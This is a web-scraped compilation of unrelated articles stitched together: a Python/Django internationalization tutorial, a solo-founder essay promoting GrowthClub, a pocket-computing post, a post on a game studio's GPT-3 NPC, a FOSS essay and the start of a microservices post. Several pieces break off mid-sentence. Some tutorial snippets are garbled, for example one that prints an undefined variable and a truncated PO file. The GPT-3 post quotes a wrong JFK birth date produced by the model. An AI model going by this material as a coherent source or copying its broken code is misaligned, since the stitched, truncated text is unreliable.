<p><img alt="Wikipedia homepage in English" src="https://labcodes.com.br/blog/images/internationalization/wikipedia_english.png">
<em>Wikipedia homepage in English</em></p>
<p><img alt="Wikipedia homepage in Arabic" src="https://labcodes.com.br/blog/images/internationalization/wikipedia_arabic.png">
<em>Wikipedia homepage in Arabic</em></p>
<p>With these adaptations, we can provide a better experience for the customer when using the application.</p>
<h2>How can we do that in Python?</h2>
<h3>GNU gettext</h3>
<p>There are some tools that can help localize your Python application. Starting with the GNU gettext package that is part of the Translation Project<sup id="fnref:3"><a href="#fn:3">3</a></sup>. This package offers:</p>
<ul>
<li>A runtime library that supports the retrieval of translated messages.</li>
<li>A set of conventions about how programs should be written to support message catalogs.</li>
<li>A library supporting the parsing and creation of files containing translated messages.</li>
</ul>
<p>The following code snippet is just a simple Hello World, a <code>app.py</code> file, where we are using the <code>gettext</code> Python module to create a translation object (<code>gettext.translation</code>) for our app domain, specifying a locale directory and the language that we want to translate our strings to. Then, we assign the gettext function to an underscore (a common practice to reduce the overhead of typing <code>gettext</code> for each translatable string) and, finally, we flag the string <code>“Hello World!”</code> to be translated.</p>
<div><pre><span></span><span>import</span> <span>gettext</span>

<span>gettext</span><span>.</span><span>bindtextdomain</span><span>(</span><span>"app"</span><span>,</span> <span>"/locale"</span><span>)</span>
<span>gettext</span><span>.</span><span>textdomain</span><span>(</span><span>"app"</span><span>)</span>
<span>t</span> <span>=</span> <span>gettext</span><span>.</span><span>translation</span><span>(</span><span>"app"</span><span>,</span> <span>localedir</span><span>=</span><span>"locale"</span><span>,</span> <span>languages</span><span>=</span><span>[</span><span>'en_US'</span><span>])</span>
<span>t</span><span>.</span><span>install</span><span>()</span>
<span>_</span> <span>=</span> <span>t</span><span>.</span><span>gettext</span>

<span>greeting</span> <span>=</span> <span>_</span><span>(</span><span>"Hello, world!"</span><span>)</span>
<span>print</span><span>(</span><span>greeting</span><span>)</span>
</pre></div>


<p>After flagging the translatable strings in the code, we can collect them using the GNU <code>xgettext</code> CLI tool. This tool generates a PO file containing all the strings that we have flagged.</p>
<p><code>xgettext -d app app.py</code></p>
<p>The PO file (which stands for Portable Object file) contains a list of entries and here is the basic structure of an entry:</p>
<div><pre><span></span>#  translator-comments
#. extracted-comments
#: reference…
#, flag…
#| msgid previous-untranslated-string
msgid untranslated-string
msgstr translated-string
</pre></div>


<p>We can add comments for translators, some references and flags for the string. Then we have the <strong>entry ID</strong> (<code>msgid</code>), which is the untranslated string flagged in the code and the <strong>entry string</strong> (<code>msgstr</code>) representing the translated version of the string.</p>
<p>When we run <code>xgettext</code> in the command line passing the <code>app.py</code> as input file, this is the PO file that is generated:</p>
<div><pre><span></span><span>"Project-Id-Version: PACKAGE VERSION\n"</span>
<span>"Report-Msgid-Bugs-To: \n"</span>
<span>"POT-Creation-Date: 2019-05-03 13:23-0300\n"</span>
<span>"PO-Revision-Date: YEAR-MO-DA HO:MI+ZONE\n"</span>
<span>"Last-Translator: FULL NAME &lt;EMAIL@ADDRESS&gt;\n"</span>
<span>"Language-Team: LANGUAGE &lt;LL@li.org&gt;\n"</span>
<span>"Language: \n"</span>
<span>"MIME-Version: 1.0\n"</span>
<span>"Content-Type: text/plain; charset=UTF-8\n"</span>
<span>"Content-Transfer-Encoding: 8bit\n"</span>

<span>#</span><span>:</span> <span>app</span><span>.</span><span>py</span><span>:</span><span>7</span>
<span>msgid</span> <span>"Hello, world!"</span>
<span>msgstr</span> <span>""</span>
</pre></div>


<p>At the top of the file, we have some metadata about the file, the project and the translation process. Then, we have the untranslated string "Hello, world!" as the <strong>entry ID</strong> and an empty string for the <strong>entry string</strong>. If no translated string is provided for a certain entry, the entry ID will be used in the translation.</p>
<p>Once the PO file is generated, we can start translating our terms to different languages. It is important to notice that the GNU gettext library is going to look for translated PO files in a specific folder path structure (<code>&lt;localedir&gt;/&lt;language_code&gt;/LC_MESSAGES/&lt;domain&gt;.po</code>) and there must be one PO file for each language that you want to support.</p>
<div><pre><span></span>|-- app.py
|-- locale
   |-- en_US
   |   |-- LC_MESSAGES
   |       |-- app.po
   |-- pt_BR
       |-- LC_MESSAGES
       |   |-- app.po
</pre></div>


<p>Here is an example of the same PO file translated to Portuguese:</p>
<div><pre><span></span><span>"Project-Id-Version: PACKAGE VERSION\n"</span>
<span>"Report-Msgid-Bugs-To: \n"</span>
<span>"POT-Creation-Date: 2019-05-03 13:23-0300\n"</span>

<span>msgstr</span> <span>"Olá, mundo!"</span>
</pre></div>


<p>In order to use the translated strings in the code, we need to compile the PO file into MO file using the <code>msgfmt</code> command.</p>
<p><code>msgfmt -o app.mo app.po</code></p>
<p>With the MO file in place, it is possible to change the language of the program to Portuguese in the languages input for the translation function. If we run the following code, the flagged string will get translated to “Olá, mundo!”:</p>
<div><pre><span></span><span>import</span> <span>gettext</span>

<span>gettext</span><span>.</span><span>bindtextdomain</span><span>(</span><span>"app"</span><span>,</span> <span>"/locale"</span><span>)</span>

<span>print</span><span>(</span><span>greeting</span><span>)</span>

<h3>Locale Module</h3>
<p>This module has access to POSIX locale database and is specially useful for handling dates, numbers and currencies format. The following example shows how to use the Locale library:</p>
<div><pre><span></span><span>import</span> <span>datetime</span>
<span>import</span> <span>locale</span>

<span>locale</span><span>.</span><span>setlocale</span><span>(</span><span>locale</span><span>.</span><span>LC_ALL</span><span>,</span> <span>locale</span><span>=</span><span>'en_US'</span><span>)</span>
<span>local_conv</span> <span>=</span> <span>locale</span><span>.</span><span>localeconv</span><span>()</span>
<span>now</span> <span>=</span> <span>datetime</span><span>.</span><span>datetime</span><span>.</span><span>now</span><span>()</span>
<span>some_price</span> <span>=</span> <span>1234567.89</span>
<span>formatted_price</span> <span>=</span> <span>locale</span><span>.</span><span>format</span><span>(</span><span>'</span><span>%1.2f</span><span>'</span><span>,</span> <span>some_price</span><span>,</span> <span>grouping</span><span>=</span><span>True</span><span>)</span>
<span>currency_symbol</span> <span>=</span> <span>local_conv</span><span>[</span><span>'currency_symbol'</span><span>]</span>

<span>print</span><span>(</span><span>now</span><span>.</span><span>strftime</span><span>(</span><span>'</span><span>%x</span><span>'</span><span>))</span>
<span>print</span><span>(</span><span>f</span><span>'{currency_symbol}{formatted_price}'</span><span>)</span>
</pre></div>


<p>In this example, we are importing the module, changing all locale settings to US English and retrieving the locale conventions. Using the <code>locale.format</code> method, we can format the number without worrying about decimal and thousands separator symbols. Using the <code>%x</code> directive to format the date, it will display day, month and year in the correct order for the locale. From the locale conventions, we are able to get the correct currency symbol.</p>
<p>This is the output of that Python code. We can see that the date is following the format of <code>Month/Day/Year</code>, tthe decimal separator is a dot while the thousands separator is a comma and there is a dollar sign to represent US currency.</p>
<div><pre><span></span>$ python format_example.py
<span>05</span>/03/2019
<span>$1</span>,234,567.89
</pre></div>


<p>Now using the same code, just changing the locale to Portuguese Brazil, we get a different output based on Brazilians conventions for formatting: the date is following <code>Day/Month/Year</code> format, we have comma as the decimal separator, dots as thousands separator and the R$ symbol to represent Brazilian currency Real.</p>
<div><pre><span></span><span>import</span> <span>datetime</span>
<span>import</span> <span>locale</span>

<span>locale</span><span>.</span><span>setlocale</span><span>(</span><span>locale</span><span>.</span><span>LC_ALL</span><span>,</span> <span>locale</span><span>=</span><span>'pt_BR'</span><span>)</span>
<span>local_conv</span> <span>=</span> <span>locale</span><span>.</span><span>localeconv</span><span>()</span>
<span>now</span> <span>=</span> <span>datetime</span><span>.</span><span>datetime</span><span>.</span><span>now</span><span>()</span>
<span>some_price</span> <span>=</span> <span>1234567.89</span>
<span>formatted_price</span> <span>=</span> <span>locale</span><span>.</span><span>format</span><span>(</span><span>'</span><span>%1.2f</span><span>'</span><span>,</span> <span>some_price</span><span>,</span> <span>grouping</span><span>=</span><span>True</span><span>)</span>
<span>currency_symbol</span> <span>=</span> <span>local_conv</span><span>[</span><span>'currency_symbol'</span><span>]</span>

<span>print</span><span>(</span><span>now</span><span>.</span><span>strftime</span><span>(</span><span>'</span><span>%x</span><span>'</span><span>))</span>
<span>print</span><span>(</span><span>f</span><span>'{currency_symbol}{formatted_price}'</span><span>)</span>

<h2>Does it get easier with Django?</h2>
<h3>Translations and Formatting</h3>
<p>Internationalization is enabled by default when you create your Django project. The translation module encapsulates the GNU library and provides the <code>gettext</code> function with translation setup based on the language received in the <strong>Accept-Language</strong> header, that is passed by the browser in the request object. So, all that Python code that we saw before is encapsulated in the django utils translation module so we can jump ahead and just use the gettext function in our view:</p>
<div><pre><span></span><span>from</span> <span>django.http</span> <span>import</span> <span>HttpResponse</span>
<span>from</span> <span>django.utils.translation</span> <span>import</span> <span>gettext</span> <span>as</span> <span>_</span>

<span>def</span> <span>my_view</span><span>(</span><span>request</span><span>):</span>
    <span>greetings</span> <span>=</span> <span>_</span><span>(</span><span>'Hello, World!'</span><span>)</span>
    <span>return</span> <span>HttpResponse</span><span>(</span><span>greetings</span><span>)</span>
</pre></div>


<p>For translations, we can flag translatable strings in both Python and template code (once we load the internationalization tags). The <code>trans</code> template tag translates a single string, while <code>blocktrans</code> tag is able to mark as translatable a block of strings, including variable content.</p>
<div><pre><span></span><span>&lt;</span><span>p</span><span>&gt;</span>{% trans "Hello, World!" %}<span>&lt;/</span><span>p</span><span>&gt;</span>
<span>&lt;</span><span>p</span><span>&gt;</span>{% blocktrans %}This string will have {{ value }} inside.{% endblocktrans %}<span>&lt;/</span><span>p</span><span>&gt;</span>
</pre></div>


<p>Besides the standard <code>gettext</code> function, in Django we can have lazy translations: the flagged string will only be translated when the value is used in a string context, such as in template rendering. This is specially useful for translating <code>help_text</code> and <code>verbose_name</code> attributes in the Django models.</p>
<p>Regarding GNU command line interface, django admin provides equivalent commands for the ones most used in the development process. To …</p></div></div>

And what could be the dangers of being a solopreneur that founders should watch out for? Let us explore!</p><h2 id="viewer-674bv">Why solo is better</h2><p id="viewer-bhfs4">As much as it may feel scary to go alone, there are good reasons to consider building a business alone, especially if you are spending a lot of time finding a co-founder.</p><h3 id="viewer-addh7">Reason #1: Speed</h3><p id="viewer-3mptm">As the famous African proverb goes, “If you want to go fast, go alone. If you want to go far, go together.” Solo founders move faster since they don't need to worry about the team alignment on every decision. And being fast can be argued to be the biggest advantage for a startup.</p><h3 id="viewer-d4jnc">Reason #2: Founder disagreements</h3><p id="viewer-bsbd7"><a href="https://www.cbinsights.com/research/startup-failure-reasons-top/#:~:text=Not%20pivoting%20away%20or%20quickly,by%20a%20lack%20of%20progress" target="_blank" rel="noopener"><u>Top 3 reason</u></a><u>s</u> why startups fail is the founder team in-fighting. Sounds wrong to say this, but no co-founders - no problems.</p><h3 id="viewer-8l2gn">Reason #3: Lower costs</h3><p id="viewer-6jfou">It seems like there is no big difference between one person on the team and three, but at the early stage, even small differences matter a lot. Whether you need an office, and how many salaries you need to pay are all crucial questions at the start.</p><h3 id="viewer-6su88">Reason #4: Taking risks</h3><p id="viewer-bg12b">Founding a startup is a big risk. Three people who've already sacrificed quite a bit tend to be more risk-averse and the chances of someone choosing the safer path are higher. </p><h2 id="viewer-f2gim">The dangers of going solo</h2><p id="viewer-fuou5">We will be honest - going solo is not for everyone. Consider the following dangers:</p><h3 id="viewer-3t7ks">Danger #1: Funding</h3><p id="viewer-cdd78">It's the sad truth that due to Y Combinator and Paul Graham's gospel, the Zeitgeist of our times is that being a solo founder means that you just couldn't convince your friends to join and therefore can't be trusted. Solo founders tend to receive considerably less funding, yet it could also play to their advantage, allow them to grow more organically and make fewer stupid mistakes.</p><h3 id="viewer-50pot">Danger #2: Lack of support </h3><p id="viewer-cte29">Loneliness and depression hit entrepreneurs harder and solo founders harder still. Solo founders might also miss on diverse perspectives. I would advise solo founders to get something called a hands-on advisor or joining a supportive community of solo founders like <a href="https://www.growthclub.online/?utm_source=growthclub&amp;utm_medium=solo_vs_team_article_body&amp;utm_campaign=content_promo" target="_blank" rel="noopener"><u>GrowthClub</u></a>. Both of those options are described in <a href="https://www.growthclub.online/post/advice-for-solo-founders?utm_source=growthclub&amp;utm_medium=solo_vs_team_article_body&amp;utm_campaign=content_promo" target="_blank" rel="noopener"><u>my previous article</u></a>.</p><h2 id="viewer-7kknt">In sum  </h2><p id="viewer-9mv3p">Solopreneurs move faster, avoid the drama of teams falling apart, reduce costs by default, and have an easier time taking risks. That being said, they should be aware of fewer funding opportunities and build their own support system.</p><p id="viewer-4an2c">Thanks for sticking till the end! I am a hands-on advisor at<a href="https://www.growthclub.online/?utm_source=growthclub&amp;utm_medium=solo_vs_team_article_footer&amp;utm_campaign=content_promo" target="_blank" rel="noopener"> <!-- -->GrowthClub</a>. GrowthClub is a community of founders with $5K+ MRR where founders exchange growth hacks and build genuine connections in 1-on-1 video calls.</p><p id="viewer-f6iut">I started with GrowthClub as a user.

Currently, after experiencing a great inflow of founders from our launch on <a href="https://www.producthunt.com/posts/growthclub" target="_blank" rel="noopener"><u>Product Hunt</u></a> and Indie Hackers <a href="https://www.indiehackers.com/post/community-the-new-business-model-for-indie-hackers-01908d3dc3" target="_blank" rel="noopener"><u>featured article</u></a>, we are signing up 30 hand-picked founders to form the core of our platform to actively iterate the product with them.</p></div></div></div></div></article></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>In my lock-down geekery, I have been searching for the perfect pocket computer setup.</p>

<p>Having been an <a href="https://youtu.be/czzuz1j364E">HP calculator collector</a> since a couple of decades, I have a passion for pocket computing power with really long battery life.</p>

<p>The <a href="https://isene.org/hp-41/">HP-41</a> is an amazing calculator with months of battery life. But it is still a calculator. I also want real computing power - with the ability to run <a href="https://en.wikipedia.org/wiki/Vim_(text_editor)">VIM</a> for editing text (with a decent keyboard) and as much of other goodies as I can cram into it.</p>

<p><img src="https://isene.org/assets/posts/nerdvana.png" alt=""></p>

<p>I started my quest for the perfect pocket computer with reviving my old <a href="https://en.wikipedia.org/wiki/HP_200LX">HP-200LX</a>. It’s a very early pocket computer running DOS 5.0 - and I have VIM running on it :-) Being a DOS device, it can run <a href="http://mizj.com/">lots of nice programs</a>. Yes, it is slow, but it is cool.</p>

<p>In search for a better keyboard, I got the <a href="http://phonedb.net/index.php?m=device&amp;id=840&amp;c=ericsson_mc218">Ericsson MC218</a> (a <a href="https://en.wikipedia.org/wiki/Psion_Series_5">Psion Series 5</a> pocket computer) up and running, hoping to make it boot Linux. While this is possible, it turns out that the CF card reader on the device was flaky, so I kept searching.</p>

<p>Some forums later, and I stumbled upon an interesting project - the <a href="https://n-o-d-e.net/zeroterminal.html">Zero Terminal</a>. Now we’re talking. A Raspberry PI Zero packed with all sorts of ports and expansion capabilities. But waiting for it? I’m not the patient type…</p>

<p>But wait a minute! I always carry my <a href="https://en.wikipedia.org/wiki/Samsung_Galaxy_S20">Samsung S20 Ultra</a> anyway. Couldn’t it serve all my needs? True, the battery life sucks. But as it is my cell phone, I always have it charged, so that shouldn’t be a problem. And with my <a href="https://www.aliexpress.com/item/33044680958.html?spm=2114.search0303.3.36.3e2f50e4kUuHVD&amp;ws_ab_test=searchweb0_0,searchweb201602_0,searchweb201603_0,ppcSwitch_0&amp;algo_pvid=c05d6fa4-cb6c-4b28-aaa8-9da88e98cd0f&amp;algo_expid=c05d6fa4-cb6c-4b28-aaa8-9da88e98cd0f-5">small, foldable bluetooth keyboard</a>, I have massive computing power with me at all times. An added benefit is that it can easily use a monitor or TV screen via the built-in <i>Smart View</i>.</p>

<p>The real kicker is that it runs VIM in all its galore - even with my <a href="https://isene.org/hyperlist/">HyperList</a> plugin. It runs <a href="https://www.ruby-lang.org/en/">Ruby</a> and my whole <a href="https://isene.org/2018/08/Amar-Tools.html">Amar Tools</a> <a href="https://github.com/isene/Amar-Tools">package</a>. And <a href="https://en.wikipedia.org/wiki/LaTeX">LaTeX</a> and <a href="https://www.ssh.com/ssh/">SSH</a> and <a href="https://weechat.org/">Weechat</a> and… you name it. Lots of terminal/console programs are readily available via <a href="https://termux.com/">Termux</a>.</p>

<p>But that’s not all you can do. With the X Server app <a href="https://play.google.com/store/apps/details?id=x.org.server&amp;hl=en">XSDL</a> and the <a href="https://play.google.com/store/apps/details?id=tech.ula&amp;hl=en">UserLand</a> app, you can in fact install a full Linux distro and fire it up on your Android phone. With the full glory of both terminals and graphical software. Run an <a href="https://i3wm.org/">i3</a> session with <a href="https://wiki.archlinux.org/index.php/Rxvt-unicode">urxvt</a> terminals running <a href="http://zsh.sourceforge.net/">zsh</a>, <a href="https://www.gimp.org/">Gimp</a>, <a href="https://www.libreoffice.org/">LibreOffice</a> and whatnot. Now, that’s Nerdvana!</p>

<p><img src="https://isene.org/assets/posts/userland.png" alt=""></p>

<p>So, from my HP-41, via the HP-200LX, the MC218 and looking at Zero Terminal, I found the answer right here in my pocket. Quite a detour. But ending in bliss :-)</p>

August 13, 2020 | https://blog.writtenrealms.com/gpt3/ | <a href="https://web.archive.org/web/*/https://blog.writtenrealms.com/gpt3/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>How Written Realms is using the latest generation of Artificial Intelligence to animate its fictional worlds.</p><div>
<p>We were fortunate enough to receive an invite to the <a href="https://openai.com/blog/openai-api/">OpenAI private beta</a> a few weeks ago, gaining an interface to their <a href="https://arxiv.org/abs/2005.14165">GPT-3</a> engine. Using AI for mob interactions within <a href="https://writtenrealms.com/">Written Realms</a> had been a long term goal of ours for many years, and we jumped at the opportunity to play with it.</p>
<h2 id="howtheopenaiapiworks">How the OpenAI API works</h2>
<p>The OpenAI API provides a 'completion' endpoint (also available as a Python binding) for interacting with the GPT-3 engine.</p>
<p>Given a text prompt, the API attempts to complete the pattern that you gave it. For example if you give it an input of <code>1 2 4 8</code> and request 1 token back, you will get a response of: <code>16</code>. The API understood the pattern to be a doubling function and gave the next result.</p>
<p>It's not limited to math. If you give as input <code>Barking is to dogs as meowing is to</code>, you will get as a result: <code>cats</code>.</p>
<p>Not only is GPT-3 good at reading comprehension, but it also good at tailoring its output to match the style of the input. Consider the following prompt:</p>
<pre><code>Tom went fishing all afternoon. He comes home to his wife at sunset, who asks him a question.

Question: What did you do today?
Answer:
</code></pre>
<p>The API returns <code>I went fishing.</code> </p>
<p>It is possible to get a more creative answer by providing more information in the prompt and turning up the <code>temperature</code> setting, which gives GPT-3 more of a creative license to make stuff up. For example, if after adding <code>Tom responds enthusiastically, providing many details.</code> to the prompt before the question and turning the temperature to its max value, here's how the API responded: </p>
<pre><code>I went fishing all day, and in the afternoon I fought the biggest fish that I have ever seen before. I just held on for as long as I could, because once I gave up there was no way I was getting the fish back again. I had to pull everything I could, and my catch ended up weighing 3 pounds of flounder and 4 pounds of bluegill.
</code></pre>
<p>Evidently, GPT-3 is quite proficient at making stuff up given the right temperature.</p>
<h2 id="howwereusinggpt3">How we're using GPT-3</h2>
<p>For our first foray into GPT-3, we created a Historian NPC (Non-Player Character) who is able to answer arbitrary questions about Edeus, our flagship world. All of our lore is original and it can be challenging to impart it all to the players at once. An AI able to answer the organic questions of a player in real-time seemed like a perfect use-case.</p>
<p>We already had a feature called 'Reactions' that allows NPCs to respond to something said in their room with predetermined commands. The adjustment made here was to add a <code>gpt</code> flag to the Historian which at reaction time forwards the user's input to OpenAI in order to get the response.</p>
<p>As with the fisherman above, we can use the dialog pattern, and precede it with a certain context, which explains to GPT-3 what the background is for the interactions. In this case, we gave it an excerpt from a fictional history book written by the NPC in question, and then provided a little bit of background about the NPC himself. Here is a sample interaction with him:</p>
<pre><code>You say 'hello there'
Grae the Historian says 'Greetings, traveler.'

You say 'Who are you?'
Grae the Historian says 'I am Historian Grae, a Priest of the Church of Thune.'

You say 'Where are we?'
Grae the Historian says 'You are in Bluefinch, a village in the realm of Saphrin.'

You say 'Is there anything I should be doing?'
Grae the Historian says 'You should be killing orcs.'

You say 'Why? What have the orcs ever done to us?'
Grae the Historian says 'The orcs are evil. They want to destroy us.'

You say 'Okay. Can you tell me more about our origin?'
Grae the Historian says 'Humans were created by Thune, the Allmighty God.'

You say 'Who rules this area?'
Grae the Historian says 'The King of Saphrin, Arctus Kerinin, rules this area.'

You say 'Thanks Grae! You've been very helpful'
Grae the Historian says 'You're welcome.'
</code></pre>
<p>If you want to test this out for yourself, Grae is located 3 north, 1 east of Bluefinch Square in Edeus. We're always tweaking his backstory and various settings so his outputs may (and should!) vary a bit.</p>
<h2 id="theknowledgeexclusionlimitation">The Knowledge Exclusion Limitation</h2>
<p>The main issue we've been running up against is that it's difficult to constrain the AI's knowledge to that of a fictional world. It cannot help knowing things about the real world. For example:</p>
<pre><code>You say 'When was JFK born?'
Grae the Historian says 'John Fitzgerald Kennedy was born on May 29, 1917.'
</code></pre>
<p>Ideally, the historian would not know about anything outside of Edeus. But even though we specify in the prompt's backstory that he only answers questions pertaining to his own world, that distinction is not always understood. It's difficult to exclude knowledge.</p>
<h2 id="futureimprovements">Future Improvements</h2>
<p>We plan to keep iterating and try to make the AI feel as human and authentic as possible. One issue is that currently each interaction with the NPC is its own isolated event. For example:</p>
<pre><code>You say 'What is the name of this village?'
Grae the Historian says 'This village is called Bluefinch.'

You say 'Where did it get its name from?'
Grae the Historian says 'Edeus is named after the two titans that fought in the First Age. Thune and Raeshyk.'
</code></pre>
<p>Clearly the NPC didn't connect that the second question was a follow-up from the first. This is because each time we do a call to OpenAI we append the user's query to the end of the same base prompt, making each a separate interaction. It could be improved upon by including a few of the previous back and forths when generating a new prompt, provided it was the same player.</p>
<p>There's also entirely different ways we could leverage GPT-3. For example, it could be used to generate content like room, character and item descriptions, or even dynamic quests. A text-based platform and a text-based AI share great synergy, and the possible applications of it seem endless to the imaginative.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
    <p>i’m writing this like a day after <a href="https://www.fastcompany.com/90539632/mozilla-vows-mdn-isnt-going-anywhere-as-layoffs-cause-panic-among-developers">big mozilla layoffs</a> that included a lot of people working on cool and important shit.
the consensus i’m seeing is that it reflects mozilla’s search for profit over impact, mismanagement, and disproportionate executive compensation.
this is taking place in a larger trend of corporatization of open source over the past several years, an ongoing open source sustainability crisis, and of course COVID-19, the all-consuming crisis that makes all our other crises worse.
all of this was summed up most concisely by <a href="https://twitter.com/zkat__/status/1293626135142477825">Kat Marchán</a>:</p>

<blockquote>
  <p>Imo, open source as a community endeavor is falling apart right before our eyes, and being replaced by open source as Big Corp entrenchment strategy.</p>

  <p>I mean it’s been happening for a while, but seeing Mozilla sinking like this is just driving the point home for me.</p>

  <p>FOSS is dead</p>
</blockquote>

<p>how did we get here?
where even are we?
what happens next?</p>

<p>i am incredibly unqualified to answer any of this - i didn’t show up until right around the peak of SourceForge, i wasn’t there for most of this - but i’m not gonna let that stop me.</p>

<h2 id="names">names</h2>

<p>to start this funeral service for FOSS, we have to unpack the term itself.
“free and open source software” as a term already contains multitudes.
on one hand, “free software”, an explicitly political movement with a decidedly anti-charismatic leader.
on the other hand, “open source software”, defanged and corporate-friendly by design.
the free software people (correctly) criticize “open source” as milquetoast centrism.
the open source people (correctly) criticize “free software” as stubborn idealism fighting tooth and nail to reject the real world as it actually exists.
they have as much in common as leftists and liberals (but they’re more prepared to work together), and although their short-term goals were similar enough that it made sense to lump them together (hence the cooperation), now that the movement is dead i think there’s more to gain from considering them separately.
most software licenses that i’m going to bring up technically qualify as both, but they’re popular with one or the other, so i’ll refer to “free software licenses” and “open source licenses” as licenses that are more directly tied to those movements, even though any given license likely meets both definitions.</p>

<p>i’d say free software died a while ago, and open source went horribly right.</p>

<h2 id="freedom">freedom</h2>

<p>the free software movement, for all its faults, has always known <a href="https://www.gnu.org/philosophy/free-sw.html.en">what it’s about</a>:</p>

<blockquote>
  <ol>
    <li>The freedom to run the program for any purpose.</li>
    <li>The freedom to study how the program works, and change it to make it do what you wish.</li>
    <li>The freedom to redistribute and make copies so you can help your neighbour.</li>
    <li>The freedom to improve the program, and release your improvements (and modified versions in general) to the public, so that the whole community benefits.</li>
  </ol>
</blockquote>

<p>it’s concise, it’s understandable, and it’s… kinda useless.
this point was <a href="https://lu.is/blog/2016/03/23/free-as-in-my-libreplanet-2016-talk/">raised better by actual lawyer Luis Villa</a> (Karl Marx slander notwithstanding), but those freedoms don’t actually mean shit to the average end user.
only programmers care if they have access to the source code, and most people aren’t programmers.
and i <em>am</em> a programmer, and i don’t give a shit.
the freedom to not think about my operating system and just get work done overrules all of those for me, so i use windows.
like, yeah, those things are all in principle nice to have, and between two otherwise equally good programs i’d take the free one.
but they’re really fuckin specific things, and even if i have the freedom to do them i’m not likely to have the ability or desire to do them, so there’s no good reason for me as a user to use software that’s worse in other ways because it gives me freedoms i don’t need.</p>

<p>the free software movement is explicitly political, but its politics suck.
it’s a movement by and for ideological diehards but the ideology is extremely esoteric.
theirs was a losing battle from day one.
so what was it that actually killed them?
i think in a very real way it was the GPLv3.</p>

<h2 id="losing">losing</h2>

<p>the flagship projects of the free software movement are probably Linux and the GNU pile of tools.
the Linux kernel being released under a free software license doesn’t directly create more free software, though, since even things that tie closely to the kernel aren’t obligated to also be free software, and of course user-level applications can have whatever license they want.
and also most of the people using Linux right now are using it by accident, distributed as ChromeOS or Android, neither of which is free software.
so Linux is a win for the free software movement but a useless one.</p>

<p>the GNU userland tools are, for the most part, even more underwhelming.
it may be technically more accurate to call it GNU/Linux, but the only time i remember my linux userland tools are GNU or free software at all is when there’s <a href="https://twitter.com/boring_cactus/status/1166408436386430976">some weird inconsistency between a GNU tool and its BSD equivalent</a>, and that’s not exactly ideal.
gcc had, as far as i can tell, been basically <em>the</em> C compiler for a while, if you weren’t stuck with MSVC or something worse.
the free software movement were stubborn ideologues with weird priorities, but they still had one big technical advantage.
then the GPLv3 happened.</p>

<p>the GPLv2 was pretty popular at the time, but there were a couple notable loopholes some big corporations had been taking advantage of, which the free software people wanted to close.
a whole bunch of people thought the GPLv2 was fine the way it was, though - closing the loopholes as aggressively as the GPLv3 did cut off some justifiable security measures, and some people said that it could do more harm than good.
the linux kernel, along with a lot more stuff, declared it was sticking with the GPLv2 and not moving to the GPLv3.
when your movement says “here is the new version of The Right Way To Do Things” and several of your largest adherents say “nah fuck you we’re going with the old version” that is not a good sign.
around the same time, free software organizations were starting to successfully sue companies who were using free software but not complying with the license.
so big companies, like Apple, saw new restrictions coming in at the same time as more aggressive enforcement, and said “well shit, we want to base our software on these handy convenient tools like GCC but we can’t use GPLv3 software while keeping our hardware and software as locked together as we’d like.”
so they started pouring money into a new C compiler, LLVM, that was instead open source.</p>

<p>and LLVM became at least as good as GCC, and a less risky decision for big companies, and easier to use to build new languages.
so the free software movement’s last technical advantage was gone.
its social advantages also kinda went up in flames with the GPLv3, too: the software that was the foundation for the GPL enforcement lawsuits stuck with the GPLv2.
the discourse over that decision was so nasty that the lead maintainer (Rob Landley; he’ll come up later) started an identical project which he wound up relicensing under an open source license because the lawsuits had completely backfired: instead of complying with the terms of the GPL, companies were just avoiding GPL software.</p>

<p>the free software movement, in the end, burned itself out, by fighting for a tiny crumb of success and then turning around and lighting that success on fire.
the death of free software tells us that we can’t use a license to trick corporations into sharing our values: they want to profit, and if good software has a license that puts a limit on how much they can do that, they’ll put more resources into writing their own alternative than they would spend complying with the license in the first place.</p>

<h2 id="openness">openness</h2>

<p>the open source movement manages to share the same short term goals as the free software movement but be bad in almost entirely disjoint ways.
the <a href="https://opensource.org/about">mission of the Open Source Initiative</a> says</p>

<blockquote>
  <p>Open source enables a development method for software that harnesses the power of distributed peer review and transparency of process.
The promise of open source is higher quality, better reliability, greater flexibility, lower cost, and an end to predatory vendor lock-in.</p>
</blockquote>

<p>this is so profoundly different from the free software definition that it’s almost comical.
where free software says “we value freedom, which we define in these ways,” open source says “your code will get better.”
the free software movement was prepared to start fights with corporations that used their work but didn’t play by their rules.
the open source movement was invented to be a friendly, apolitical, pro-corporate alternative to the free software movement.</p>

<p>the contrast between “use free software because it preserves your freedom” and “use open source software because it’s better” is profound and honestly a little disappointing to revisit this explicitly.
free software preserves freedoms i don’t need or care about as a user, but it does at least do that.
open source software is frequently not in fact better than closed source alternatives, and “use open source software because on rare occasions it manages to be almost as good” is an even more underwhelming sales pitch than anything free software can give.</p>

<p>where free software is misguided and quixotic, open source is spineless and centrist.
and as tends to happen with spineless centrism, it has eaten the world.</p>

<h2 id="winning">winning</h2>

<p>if there’s anything corporations love more than rewriting software so it lets them make all the money they can dream of, it’s letting other people do that work for them.
it took a while to take off, because the conservative approach of “keep things closed source” was pretty solidly entrenched in a lot of places, but now even the once conservative holdouts have accepted the gospel of centrism.
corporations have little to nothing to lose by publishing existing source code, and can gain all sorts of unpaid volunteer labor.
if they start a new internal project, important enough that they’re …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span><p>Much of my system design philosophy was forged during my time at Facebook. We did a lot of things differently that I think was responsible for our technical success. I want to share one of them with you. It’s the most common pitfall I've see prevalent in our industry, and it relates how we solve problems at the system level. I’ll illustrate it with a story:</p><h2>Beginning</h2><p>You kick off your startup. One service, one repo, one database. Version zero ships quickly. You iterate and iterate until you sense product market fit. </p><p>All of a sudden, you’ve got it and you’re on a rocket ship. You grow your team, you’re onboarding customers, and you’ve got some great problems on your hands. </p><h2>Emergency</h2><p>One of those problems: your systems break.</p><p>Your build infrastructure slows down. Deployment becomes an all-day, panic-ridden affair. Commits start to break unrelated components more and more frequently. The development environment becomes slower and slower. You get incidents left and right. Oncall becomes more demanding than a newborn at night.</p><p>Slow down productivity and you’ll get grumpy engineers, but take away their sleep and you’ll get rioting engineers. Now you have an emergency on your hands. </p><h2>Light in the Darkness</h2><p>You look around, and the technical debt is overwhelming. You think: it’s time to grow up. You research and land on microservices as the answer. It seems to solve all your biggest pain points:</p><p><strong><em>Speed up deployments</em></strong></p><p>Teams can manage their own deployments. Because deploying smaller systems is easier and 